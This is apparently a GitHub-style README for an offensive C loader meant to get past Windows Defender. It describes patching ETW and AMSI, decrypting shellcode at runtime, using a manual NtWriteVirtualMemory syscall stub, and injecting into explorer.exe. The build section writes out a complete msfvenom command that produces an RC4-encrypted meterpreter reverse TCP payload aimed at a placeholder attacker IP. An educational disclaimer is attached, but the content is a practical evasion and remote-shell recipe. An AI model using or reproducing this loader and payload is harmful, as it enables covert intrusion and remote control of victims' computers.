# WinDefender Bypass

> **Disclaimer:** This project is provided **for educational purposes only**.  
> Use it at your own risk. The author assumes **no responsibility** for any misuse or damages caused by this code. By using it, you agree that it is intended solely to study how common payloads can evade active defenses and to improve defensive techniques.

---

## Overview

**Winefender Bypass** demonstrates a multi-layered evasion loader in C that:

1. **Disables telemetry**  
   - Patches `EtwEventWrite` in `ntdll.dll`  
   - Patches `AmsiScanBuffer` in `amsi.dll`  

2. **Decodes a polymorphic shellcode**  
   - **10 iterations** of **`x64/xor_dynamic`**  
   - Followed by **RC4 encryption** with key `"UltraSecreta2025!"`  
   - Decryption happens **in-place at runtime**  

3. **Uses a manual syscall stub**  
   - Builds its own `NtWriteVirtualMemory` stub (`mov r10, rcx; mov eax,0x3A; syscall; ret`)  
   - Bypasses user‑mode API hooks  

4. **Injects and executes** in a **trusted process** (`explorer.exe`)  
   - Enumerates processes via `Toolhelp32Snapshot`  
   - Opens a handle to `explorer.exe` (`OpenProcess`)  
   - Allocates RWX memory in that process (`VirtualAllocEx`)  
   - Writes decrypted shellcode via the syscall stub  
   - Launches a remote thread (`CreateRemoteThread`)  

By moving the entire staging and execution into **Explorer**—a Microsoft‑signed process—the loader evades common heuristics and Windows Defender’s staged‑HTTP and in‑memory detections.

---

## Files

- **`loader.c`** – the full C source of the injector/loader (missing hardcoded encrypted shellcode) 
- **`README.md`** – this file  

---

## Building

You’ll need a Windows environment with a MinGW/MSYS2 toolchain:

```bash
# Compile loader.c
gcc loader.c -o loader.exe -lkernel32 -luser32

# Generate the shellcode using Msfvenom
msfvenom \
  -p windows/x64/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT \
  -a x64 --platform windows \
  -e x64/xor_dynamic -i 10 \
  --encrypt rc4 --encrypt-key UltraSecreta2025! \
  -b "\x00\x0a\x0d" \
  -f c \
  --var-name encrypted > shellcode.txt
```
